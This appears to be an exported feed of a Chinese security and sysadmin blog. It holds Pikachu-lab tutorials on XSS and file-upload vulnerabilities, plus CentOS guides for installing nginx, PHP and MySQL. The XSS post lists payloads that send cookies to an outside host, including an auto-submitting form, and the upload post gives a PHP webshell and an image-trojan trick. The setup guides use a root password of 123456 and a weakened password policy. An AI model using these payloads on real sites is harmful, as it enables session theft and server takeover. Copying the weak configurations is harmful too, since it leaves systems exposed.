    <content type="text"><![CDATA[漏洞简述跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 漏洞攻击流程 发现XSS漏洞 根据XSS漏洞类型，设定恶意代码注入至页面当中 诱导或等待用户访问该页面后将会自动执行恶意代码 根据攻击者所设定的恶意代码(如窃取用户cookie)，来进行后续攻击 XSS 漏洞类型 反射型（非持久性） 交互的数据一般不会被存在数据库里面，一次性，所见即所得，通常出现在查询类页面中 存储型（持久性） 交互的数据会被存在数据库里面，永久性存储，通常出现在留言板，注册等页面 DOM 型 不与后台服务器产生数据交互，是一种DOM操作前段代码输出的产生的问题，一次性也属于反射型 反射型 XSS反射型xss(GET)实验示例GET请求是诱导用户点击经过攻击者定制的包含恶意攻击代码的URL以达到窃取用户cookie，钓鱼等目的 Poc： 1234567- &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;- &lt;a href=&apos;&apos; onclick=alert(&apos;xss&apos;)&gt;type&lt;/a&gt;- &lt;img src=http://1.1.1.1/a.ipg onerror=alert(&apos;xss&apos;)&gt;- &lt;script&gt;window.location=&apos;http://1.1.1.1&apos;&lt;/script&gt;- &lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;- &lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt; 在浏览器表单中输入AAAAA查看源代码，用户提交的数据原封不动的返回了客户端，说明可能存在XSS 攻击漏洞注入JavaScript代码，发现表单参数输入被限制在20个字符修改前端限制字符长度的HTML代码再次注入JavaScript代码出现弹窗内容为XSS，说明存在XSS漏洞由于该网页传参方式为GET，其实可以直接在URL中传参，前端限制无法影响URL到后端的传参 反射型xss(POST)实验示例（窃取用户cookie） POST请求区别与GET请求，POST请求无法通过定制的URL让用户向服务器提交数据。所以为了达到目的，需要攻击者搭建一个网站在网页内写入一个自动向服务器提交恶意代码的POST表单，而后诱导用户在登入用户的状态下访问该网站，在用户访问该网站时代码将自动将cookie发送给攻击者。 POST表单代码如下： 1234567891011121314&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload=function()&#123; //访问页面时，自动提交表单 document.getElementById("postsubmit").click(); &#125;&lt;/script&gt;&gt;&lt;/head&gt;&gt;&lt;body&gt; //XSS漏洞页面URL&lt;form method="post" action="http://127.0.0.1/pika/vul/xss/xsspost/xss_reflected_post.php"&gt; /script窃取cookie的恶意代码 &lt;input id="xss_in" type="text" name="message" value="&lt;script&gt; document.location = 'http://127.0.0.1/pika/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;"/&gt; &lt;input id="postsubmit" type="submit" name="submit" value="submit"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 被害用户视角模拟：登陆用户至漏洞页面 访问恶意网站http://127.0.0.1/cook.html数据提交成功后将自动重定向至pikachu主页 查看XSS后台cookie资料 存储型 XSS存储型XSS漏洞跟反射型XSS漏洞形成的原因一致，区别在于反射型XSS注入的恶意代码是一次性的，而存储型XSS会将攻击者注入的代码存放至后台，例如留言板等。 存储型XSS实验示例访问漏洞页面留言板:http://127.0.0.1/pika/vul/xss/xss_stored.php注入测试代码 1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 查看源代码: DOM型 XSS参考链接:https://blog.csdn.net/weixin_43899561/article/details/89429726 一、什么是DOM?怎么理解DOM?DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。 首先DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Documentobject文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用 DOM型 XSS 实验示例1:页面源代码: 1234567891011121314&lt;div id="xssd_main"&gt; &lt;script&gt; function domxss()&#123; var str = document.getElementById("text").value; document.getElementById("dom").innerHTML = "&lt;a href='"+str+"'&gt;what do you see?&lt;/a&gt;"; &#125; //试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt; //试试：' onclick="alert('xss')"&gt;,闭合掉就行 &lt;/script&gt; &lt;!--&lt;a href="" onclick=('xss')&gt;--&gt; &lt;input id="text" name="text" type="text" value="" /&gt; &lt;input id="button" type="button" value="click me!" onclick="domxss()" /&gt; &lt;div id="dom"&gt;&lt;/div&gt;&lt;/div&gt; 漏洞位于&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;其中str是攻击者可控制的需要闭合a标签的href，加一个单引号闭合，最后再加上我们弹窗指令和闭合符号&quot;&lt;a href=&#39;&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;what do you see?&lt;/a&gt;&quot;Poc：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt; 注入代码点击跳转链接，弹出警告窗口]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos7.2搭建LNMP]]></title>
    <url>%2F2019%2F08%2F26%2FCentos7-2%E6%90%AD%E5%BB%BALNMP%2F</url>
    <content type="text"><![CDATA[参考材料:https://blog.csdn.net/u014558668/article/details/79314878https://www.jianshu.com/p/9f678ddea1f8https://blog.csdn.net/ruoxiyun/article/details/86980974 系统版本 Centos 7.2.151112[root@localhost ~]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core) Nginx安装Nginx 版本 1.14.2具体安装步骤:https://oldsix-sec.github.io/2019/08/26/Centos7-2安装nginx/#more 配置防火墙12345678910111213141516171819202122232425------------------------------------------------查看服务状态------------------------------------------------[root@localhost ~]# systemctl status firewalld● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled) Active: active (running) since 二 2019-08-27 00:24:53 CST; 2h 34min ago Main PID: 1245 (firewalld) CGroup: /system.slice/firewalld.service └─1245 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid8月 27 00:24:51 localhost.localdomain systemd[1]: Starting firewalld - dynamic firewall daemon...8月 27 00:24:53 localhost.localdomain systemd[1]: Started firewalld - dynamic firewall daemon.------------------------------------------------开启TCP80端口-----------------------------------------------[root@localhost ~]# firewall-cmd --add-port=80/tcpsuccess------------------------------------------------查看防火墙信息----------------------------------------------[root@localhost ~]# firewall-cmd --list-allpublic (default, active) interfaces: eno16777736 sources: services: dhcpv6-client ssh ports: 80/tcp masquerade: no forward-ports: icmp-blocks: rich rules: 访问Nginx网站 MySQL安装MySQL版本：5.7.27具体安装步骤:https://oldsix-sec.github.io/2019/08/22/Centos7%E5%AE%89%E8%A3%85Mysql5-7/ 重置MySQL数据库1234567891011121314151617181920212223242526[root@localhost ~]# cat /var/log/mysqld.log|grep &apos;A temporary password&apos;2019-08-26T16:25:05.771387Z 1 [Note] A temporary password is generated for root@localhost: :y8GldbVdIKR[root@localhost ~]# mysql -u root -p:y8GldbVdIKRmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 10Server version: 5.7.27Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.------------------------------------------------重置密码----------------------------------------------mysql&gt; alter user root@localhost identified by &apos;:y8GldbVdIKR&apos;;Query OK, 0 rows affected (0.00 sec)----------------------------------------------修改密码策略--------------------------------------------mysql&gt; set global validate_password_policy=0;Query OK, 0 rows affected (0.01 sec)mysql&gt; set global validate_password_length=0;Query OK, 0 rows affected (0.00 sec)------------------------------------------------修改密码----------------------------------------------mysql&gt; alter user root@localhost identified by &apos;123456&apos;;Query OK, 0 rows affected (0.00 sec) 配置防火墙开启3306/tcp端口(用于远程连接MySQL服务) 123456789101112[root@localhost ~]# firewall-cmd --add-port=3306/tcpsuccess[root@localhost ~]# firewall-cmd --list-allpublic (default, active) interfaces: eno16777736 sources: services: dhcpv6-client ssh ports: 3306/tcp 80/tcp masquerade: no forward-ports: icmp-blocks: rich rules: PHP安装PHP版本：7.1.31要让PHP以FastCGI的方式与nginx进行交互，需要有PHP-FPM模块的支持。 检查是否安装php-fpm 12[root@localhost ~]# rpm -qa |grep php71w-fpmphp71w-fpm-7.1.31-1.w7.x86_64 具体安装步骤https://oldsix-sec.github.io/2019/08/26/Centos7-2%E5%AE%89%E8%A3%85PHP7-1/ 启动php-fpm 123456789101112131415161718[root@localhost ~]# systemctl start php-fpm [root@localhost ~]# systemctl status php-fpm● php-fpm.service - The PHP FastCGI Process Manager Loaded: loaded (/usr/lib/systemd/system/php-fpm.service; disabled; vendor preset: disabled) Active: active (running) since 二 2019-08-27 00:59:18 CST; 2h 27min ago Main PID: 3217 (php-fpm) Status: &quot;Processes active: 0, idle: 5, Requests: 0, slow: 0, Traffic: 0req/sec&quot; CGroup: /system.slice/php-fpm.service ├─3217 php-fpm: master process (/etc/php-fpm.conf) ├─3218 php-fpm: pool www ├─3219 php-fpm: pool www ├─3220 php-fpm: pool www ├─3221 php-fpm: pool www └─3222 php-fpm: pool www8月 27 00:59:18 localhost.localdomain systemd[1]: Starting The PHP FastCGI Process Manager...8月 27 00:59:18 localhost.localdomain systemd[1]: Started The PHP FastCGI Process Manager.8月 27 03:26:15 localhost.localdomain systemd[1]: Started The PHP FastCGI Process Manager. 配置Nginx支持PHP（FastCGI方式）编辑配置文件 /usr/local/nginx/conf/nginx.conf 修改fastcgi_param一行中的/scripts为$document_root重新加载配置文件 1[root@localhost ~]# nginx -s reload 新建一个PHP主页测试php程序 1234[root@localhost ~]# cat /usr/local/nginx/html/phpinfo.php &lt;?php phpinfo();?&gt; 访问测试页面 测试PHP连接数据库123[root@localhost html]# pwd/usr/local/nginx/html[root@localhost html]# vim sql_conn.php 123456789101112&lt;?php$servername = "127.0.0.1";//mysql服务器主机地址 $username = "root"; //mysql用户名 $password = "123456";//mysql用户名密码 // 创建连接 $link = new mysqli($servername, $username, $password);// 检测连接 if ($link-&gt;connect_error) &#123;die("Connection Failed:".$link-&gt;connect_error);&#125;echo "Connection successfully";?&gt; 访问测试页面]]></content>
      <categories>
        <category>LINUX</category>
        <category>系统服务</category>
      </categories>
      <tags>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7.2安装nginx]]></title>
    <url>%2F2019%2F08%2F26%2FCentos7-2%E5%AE%89%E8%A3%85nginx%2F</url>
    <content type="text"><![CDATA[系统版本 Centos 7.2.151112[root@localhost ~]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core) 配置安装环境 安装开发者工具： 1[root@bogon ~]# yum -y groupinstall &apos;Development Tools&apos; 安装nginx依赖软件 1[root@bogon ~]# yum -y intsall pcre pcre-devel zlib zlib-devel 源码安装nginx源码包下载地址:http://nginx.org/en/download.html 123456789[root@bogon ~]# tar -xf nginx-1.14.2[root@bogon ~]# cd nginx-1.14.2---------------配置安装信息--------------[root@bogon nginx-1.14.2]# ./configure ----------------编译安装-----------------[root@bogon nginx-1.14.2]# make [root@bogon nginx-1.14.2]# make install----------------启动服务-----------------[root@bogon ~]# /usr/local/nginx/sbin/nginx 访问网页: 后续工作查看nginx安装路径： 12[root@bogon ~]# whereis nginxnginx: /usr/sbin/nginx /usr/local/nginx 设置软链接： 1ln -sf /usr/local/nginx/sbin/nginx /usr/sbin 常用命令 nginx //启动nginx服务 ngixn -s stop //关闭nginx服务 nginx -s reload //重启nginx服务 nginx -t //检查配置文件]]></content>
      <categories>
        <category>LINUX</category>
        <category>系统服务</category>
      </categories>
      <tags>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7.2安装PHP7.1]]></title>
    <url>%2F2019%2F08%2F26%2FCentos7-2%E5%AE%89%E8%A3%85PHP7-1%2F</url>
    <content type="text"><![CDATA[PHP-FPM（PHP FastCGI Process Manager的简称，意思是 “PHP FastCGI进程管理器” ）是用于管理PHP进程池的软件，用于接收和处理来自Web服务器（例如nginx）的请求。PHP-FPM软件会创建一个主进程（通常以操作系统中根用户的身份运行），控制何时以及如何把HTTP请求转发给一个或多个子进程处理。PHP-FPM主进程还控制着什么时候创建（处理Web应用更多的流量）和销毁（子进程运行时间太久或不再需要了）PHP子进程。PHP-FPM进程池中的每个进程存在的时间都比单个HTTP请求长，可以处理10，50，100，500或更多的HTTP请求。 检查当前系统是否安装php1234567[root@localhost ~]# rpm -qa |grep phpphp-common-5.4.16-36.el7_1.x86_64php-cli-5.4.16-36.el7_1.x86_64php-5.4.16-36.el7_1.x86_64[root@localhost ~]# yum -y remove php-*[root@localhost ~]# rpm -qa |grep php[root@localhost ~]# 升级openssl检查默认安装的openssl 1234[root@localhost ~]# rpm -qa |grep opensslopenssl098e-0.9.8e-29.el7.centos.2.x86_64openssl-libs-1.0.1e-42.el7.9.x86_64openssl-1.0.1e-42.el7.9.x86_64 下载openssl-libs-1.0.2k-16.el7.x86_64.rpm包：下载地址:http://rpmfind.net/linux/rpm2html/search.php?query=libcrypto.so.10(OPENSSL_1.0.2)(64bit)&amp;submit=Search+…&amp;system=&amp;arch= 1wget http://rpmfind.net/linux/centos/7.6.1810/updates/x86_64/Packages/openssl-libs-1.0.2k-16.el7_6.1.x86_64.rpm 升级openssl 1rpm -ivh openssl-libs-1.0.2k-16.el7_6.1.x86_64.rpm --force 完成后即可安装php 配置php7.1 yum源12rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm 123456789101112[root@localhost ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm获取https://mirror.webtatic.com/yum/el7/epel-release.rpm警告：/var/tmp/rpm-tmp.YZHZBq: 头V4 RSA/SHA1 Signature, 密钥 ID 62e74ca5: NOKEY准备中... ################################# [100%]正在升级/安装... 1:epel-release-7-5 ################################# [100%][root@localhost ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm获取https://mirror.webtatic.com/yum/el7/webtatic-release.rpm警告：/var/tmp/rpm-tmp.OICsK8: 头V4 RSA/SHA1 Signature, 密钥 ID 62e74ca5: NOKEY准备中... ################################# [100%]正在升级/安装... 1:webtatic-release-7-3 ################################# [100%] 安装php及相关插件php-cli 与 php-fpm必须在openssl升级后才可安装 1yum install php71w.x86_64 php71w-cli.x86_64 php71w-common.x86_64 php71w-gd.x86_64 php71w-ldap.x86_64 php71w-mbstring.x86_64 php71w-mcrypt.x86_64 php71w-mysql.x86_64 php71w-pdo.x86_64 php71w-fpm.x86_64 检查php版本1234[root@localhost ~]# php -vPHP 7.1.31 (cli) (built: Aug 4 2019 09:25:59) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies 启动PHP-FPM1[root@localhost ~]# systemctl start php-fpm]]></content>
      <categories>
        <category>LINUX</category>
        <category>系统服务</category>
      </categories>
      <tags>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F08%2F23%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://127.0.0.1/pika 漏洞概述 在运营网站的过程中，不可避免地要对网站内容进行更新，比如用户需要上传头像、发帖需要上传附件、商品需要上传照片等，这是便需要使用网站的文件上传功能，如果不对被上传的文件进行限制，或者限制被攻击者绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上、从而进一步导致服务器沦陷。 在该漏洞中攻击者可以上传一个可执行文件到服务器，然后通过某种方式执行。上传的文件可以使木马、病毒、恶意脚本、或者WebShell等。这些功绩方式带来的危害是最直接的，且文件上传漏洞的利用技术门槛也非常低，对于攻击者来说很容易实现。 常见的文件上传漏洞的防护方式： 验证文件类型、后缀名、大小; 验证文件的上传方式; 对文件进行一定复杂的重命名; 不要暴露文件上传后的路径; Client Check实验示例： 尝试上传图片 访问上传成功的文件路径 尝试上传一句话木马 1234一句话木马代码：&lt;?php@system($_GET['cmd']);?&gt; 禁止javaScript在地址栏中输入:about:config搜索:javascript.enabled 重新上传一句话木马利用一句话木马 MIME Type实验示例 尝试上传一句话木马 利用Burp Suite修改Content-Type类型为 image/jpeg 上传成功并利用webshell getimagesize实验示例 尝试上传一句话木马 1234一句话木马内容:&lt;?php@system('ipconfig');?&gt; 制作图片木马 1234C:\Users\Asche-Q\Desktop&gt;copy /b dd.png + cmd.php ccc3.pngdd.pngcmd.php已复制 1 个文件。 上传桌面的ccc3.png图片 访问上传路径，发现上传的图片木马只以图片方式打开，其中的php代码并未执行 使用本地文件包含利用图片木马(目录遍历同理)]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>文件目录安全</category>
      </categories>
      <tags>
        <tag>文件目录安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7安装Mysql5.7]]></title>
    <url>%2F2019%2F08%2F22%2FCentos7%E5%AE%89%E8%A3%85Mysql5-7%2F</url>
    <content type="text"><![CDATA[从CentOS 7.0发布以来，yum源中开始使用mariadb来代替MySQL的安装。即使你输入的是yum install mysql , 显示的也是mariadb的安装内容。因此，如果使用yum安装MySQL的话，就需要去下载官方指定的yum源。 卸载mariadb 检查是否已安装mariadb 12[root@bogon ~]# rpm -qa |grep mariadbmariadb-libs-5.5.44-2.el7.centos.x86_64 卸载已安装的mariadb 123456789101112131415161718192021222324252627282930313233343536373839404142[root@bogon ~]# yum -y remove mariadb*已加载插件：fastestmirror正在解决依赖关系--&gt; 正在检查事务---&gt; 软件包 mariadb-libs.x86_64.1.5.5.44-2.el7.centos 将被 删除--&gt; 正在处理依赖关系 libmysqlclient.so.18()(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在处理依赖关系 libmysqlclient.so.18(libmysqlclient_18)(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在检查事务---&gt; 软件包 postfix.x86_64.2.2.10.1-6.el7 将被 删除--&gt; 解决依赖关系完成依赖关系解决=========================================================================================================== Package 架构 版本 源 大小===========================================================================================================正在删除: mariadb-libs x86_64 1:5.5.44-2.el7.centos @anaconda 4.4 M为依赖而移除: postfix x86_64 2:2.10.1-6.el7 @anaconda 12 M事务概要===========================================================================================================移除 1 软件包 (+1 依赖软件包)安装大小：17 MDownloading packages:Running transaction checkRunning transaction testTransaction test succeededRunning transaction 正在删除 : 2:postfix-2.10.1-6.el7.x86_64 1/2 正在删除 : 1:mariadb-libs-5.5.44-2.el7.centos.x86_64 2/2 验证中 : 1:mariadb-libs-5.5.44-2.el7.centos.x86_64 1/2 验证中 : 2:postfix-2.10.1-6.el7.x86_64 2/2 删除: mariadb-libs.x86_64 1:5.5.44-2.el7.centos 作为依赖被删除: postfix.x86_64 2:2.10.1-6.el7 完毕！ 安装MySQL下载官方提供的rpm包进入目录/usr/local/src/ 1[root@bogon ~]# cd /usr/local/src/ 使用wget下载rpm包: 12345678910111213141516[root@bogon src]# wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm--2019-08-21 01:23:23-- https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm正在解析主机 dev.mysql.com (dev.mysql.com)... 137.254.60.11正在连接 dev.mysql.com (dev.mysql.com)|137.254.60.11|:443... 已连接。已发出 HTTP 请求，正在等待回应... 302 Found位置：https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm [跟随至新的 URL]--2019-08-21 01:23:26-- https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm正在解析主机 repo.mysql.com (repo.mysql.com)... 104.75.165.42正在连接 repo.mysql.com (repo.mysql.com)|104.75.165.42|:443... 已连接。已发出 HTTP 请求，正在等待回应... 200 OK长度：25680 (25K) [application/x-redhat-package-manager]正在保存至: “mysql57-community-release-el7-11.noarch.rpm”100%[=================================================================&gt;] 25,680 63.1KB/s 用时 0.4s 2019-08-21 01:23:28 (63.1 KB/s) - 已保存 “mysql57-community-release-el7-11.noarch.rpm” [25680/25680]) 安装rpm包： 12345[root@bogon src]# rpm -ivh mysql57-community-release-el7-11.noarch.rpm 警告：mysql57-community-release-el7-11.noarch.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY准备中... ################################# [100%]正在升级/安装... 1:mysql57-community-release-el7-11 ################################# [100%] 检查mysql的yum源是否安装成功: 1234[root@bogon src]# yum repolist |grep mysqlmysql-connectors-community/x86_64 MySQL Connectors Community 118mysql-tools-community/x86_64 MySQL Tools Community 95mysql57-community/x86_64 MySQL 5.7 Community Server 364 使用yum安装mysql-server12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485[root@bogon ~]# yum -y install mysql-server已加载插件：fastestmirrorLoading mirror speeds from cached hostfile * c7-media: 正在解决依赖关系--&gt; 正在检查事务---&gt; 软件包 mysql-community-server.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在处理依赖关系 mysql-community-common(x86-64) = 5.7.27-1.el7，它被软件包 mysql-community-server-5.7.27-1.el7.x86_64 需要--&gt; 正在处理依赖关系 mysql-community-client(x86-64) &gt;= 5.7.9，它被软件包 mysql-community-server-5.7.27-1.el7.x86_64 需要--&gt; 正在检查事务---&gt; 软件包 mysql-community-client.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在处理依赖关系 mysql-community-libs(x86-64) &gt;= 5.7.9，它被软件包 mysql-community-client-5.7.27-1.el7.x86_64 需要---&gt; 软件包 mysql-community-common.x86_64.0.5.7.27-1.el7 将被 安装--&gt; 正在检查事务---&gt; 软件包 mariadb-libs.x86_64.1.5.5.44-2.el7.centos 将被 取代--&gt; 正在处理依赖关系 libmysqlclient.so.18()(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要--&gt; 正在处理依赖关系 libmysqlclient.so.18(libmysqlclient_18)(64bit)，它被软件包 2:postfix-2.10.1-6.el7.x86_64 需要---&gt; 软件包 mysql-community-libs.x86_64.0.5.7.27-1.el7 将被 舍弃--&gt; 正在检查事务---&gt; 软件包 mysql-community-libs-compat.x86_64.0.5.7.27-1.el7 将被 舍弃--&gt; 解决依赖关系完成依赖关系解决=========================================================================================================== Package 架构 版本 源 大小===========================================================================================================正在安装: mysql-community-libs x86_64 5.7.27-1.el7 mysql57-community 2.2 M 替换 mariadb-libs.x86_64 1:5.5.44-2.el7.centos mysql-community-libs-compat x86_64 5.7.27-1.el7 mysql57-community 2.0 M 替换 mariadb-libs.x86_64 1:5.5.44-2.el7.centos mysql-community-server x86_64 5.7.27-1.el7 mysql57-community 165 M为依赖而安装: mysql-community-client x86_64 5.7.27-1.el7 mysql57-community 24 M mysql-community-common x86_64 5.7.27-1.el7 mysql57-community 275 k事务概要===========================================================================================================安装 3 软件包 (+2 依赖软件包)总计：194 M总下载量：194 MDownloading packages:Delta RPMs disabled because /usr/bin/applydeltarpm not installed.警告：/var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.27-1.el7.x86_64.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEYmysql-community-libs-5.7.27-1.el7.x86_64.rpm 的公钥尚未安装(1/4): mysql-community-libs-5.7.27-1.el7.x86_64.rpm | 2.2 MB 00:00:01 (2/4): mysql-community-libs-compat-5.7.27-1.el7.x86_64.rpm | 2.0 MB 00:00:04 (3/4): mysql-community-client-5.7.27-1.el7.x86_64.rpm | 24 MB 00:12:10 (4/4): mysql-community-server-5.7.27-1.el7.x86_64.rpm | 165 MB 01:32:23 -----------------------------------------------------------------------------------------------------------总计 36 kB/s | 194 MB 01:32:29 从 file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql 检索密钥导入 GPG key 0x5072E1F5: 用户ID : &quot;MySQL Release Engineering &lt;mysql-build@oss.oracle.com&gt;&quot; 指纹 : a4a9 4068 76fc bd3c 4567 70c8 8c71 8d3b 5072 e1f5 软件包 : mysql57-community-release-el7-11.noarch (installed) 来自 : /etc/pki/rpm-gpg/RPM-GPG-KEY-mysqlRunning transaction checkRunning transaction testTransaction test succeededRunning transaction警告：RPM 数据库已被非 yum 程序修改。 正在安装 : mysql-community-common-5.7.27-1.el7.x86_64 1/5 正在安装 : mysql-community-libs-5.7.27-1.el7.x86_64 2/5 正在安装 : mysql-community-client-5.7.27-1.el7.x86_64 3/5 正在安装 : mysql-community-server-5.7.27-1.el7.x86_64 4/5 正在安装 : mysql-community-libs-compat-5.7.27-1.el7.x86_64 5/5 验证中 : mysql-community-libs-compat-5.7.27-1.el7.x86_64 1/5 验证中 : mysql-community-common-5.7.27-1.el7.x86_64 2/5 验证中 : mysql-community-server-5.7.27-1.el7.x86_64 3/5 验证中 : mysql-community-client-5.7.27-1.el7.x86_64 4/5 验证中 : mysql-community-libs-5.7.27-1.el7.x86_64 5/5 已安装: mysql-community-libs.x86_64 0:5.7.27-1.el7 mysql-community-libs-compat.x86_64 0:5.7.27-1.el7 mysql-community-server.x86_64 0:5.7.27-1.el7 作为依赖被安装: mysql-community-client.x86_64 0:5.7.27-1.el7 mysql-community-common.x86_64 0:5.7.27-1.el7 完毕！ 查看版本信息： 1234567891011121314151617181920212223242526272829303132333435363738[root@bogon ~]# rpm -qi mysql-community-serverName : mysql-community-serverVersion : 5.7.27Release : 1.el7Architecture: x86_64Install Date: 2019年08月21日 星期三 01时53分15秒Group : Applications/DatabasesSize : 781829281License : Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved. Under GPLv2 license as shown in the Description field.Signature : DSA/SHA1, 2019年06月12日 星期三 14时43分04秒, Key ID 8c718d3b5072e1f5Source RPM : mysql-community-5.7.27-1.el7.src.rpmBuild Date : 2019年06月10日 星期一 23时04分00秒Build Host : loki10.no.oracle.comRelocations : (not relocatable)Packager : MySQL Release Engineering &lt;mysql-build@oss.oracle.com&gt;Vendor : Oracle and/or its affiliatesURL : http://www.mysql.com/Summary : A very fast and reliable SQL database serverDescription :The MySQL(TM) software delivers a very fast, multi-threaded, multi-user,and robust SQL (Structured Query Language) database server. MySQL Serveris intended for mission-critical, heavy-load production systems as wellas for embedding into mass-deployed software. MySQL is a trademark ofOracle and/or its affiliatesThe MySQL software has Dual Licensing, which means you can use the MySQLsoftware free of charge under the GNU General Public License(http://www.gnu.org/licenses/). You can also purchase commercial MySQLlicenses from Oracle and/or its affiliates if you do not wish to be bound by the terms ofthe GPL. See the chapter &quot;Licensing and Support&quot; in the manual forfurther info.The MySQL web site (http://www.mysql.com/) provides the latest news andinformation about the MySQL software. Also please see the documentationand the manual for more information.This package includes the MySQL server binary as well as related utilitiesto run and administer a MySQL server. MySQL基本配置启动mysql服务123456789101112131415[root@bogon ~]# systemctl start mysqld[root@bogon ~]# systemctl status mysqld● mysqld.service - MySQL Server Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled) Active: active (running) since 三 2019-08-21 05:43:05 CST; 8s ago Docs: man:mysqld(8) http://dev.mysql.com/doc/refman/en/using-systemd.html Process: 27032 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS) Process: 27015 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 27036 (mysqld) CGroup: /system.slice/mysqld.service └─27036 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid8月 21 05:43:04 localhost.localdomain systemd[1]: Starting MySQL Server...8月 21 05:43:05 localhost.localdomain systemd[1]: Started MySQL Server. 使用初始密码登陆1234567891011121314151617[root@bogon ~]# cat /var/log/mysqld.log|grep &apos;A temporary password&apos;2019-08-20T20:16:55.163739Z 1 [Note] A temporary password is generated for root@localhost: MbM/x1miwUfW[root@localhost ~]# mysql -u root -pMbM/x1miwUfWmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 2Server version: 5.7.27 MySQL Community Server (GPL)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; 重置密码(登陆后必须先重置密码才可继续操作)alter user ‘root’@’localhost’ identified by ‘youpassword’; 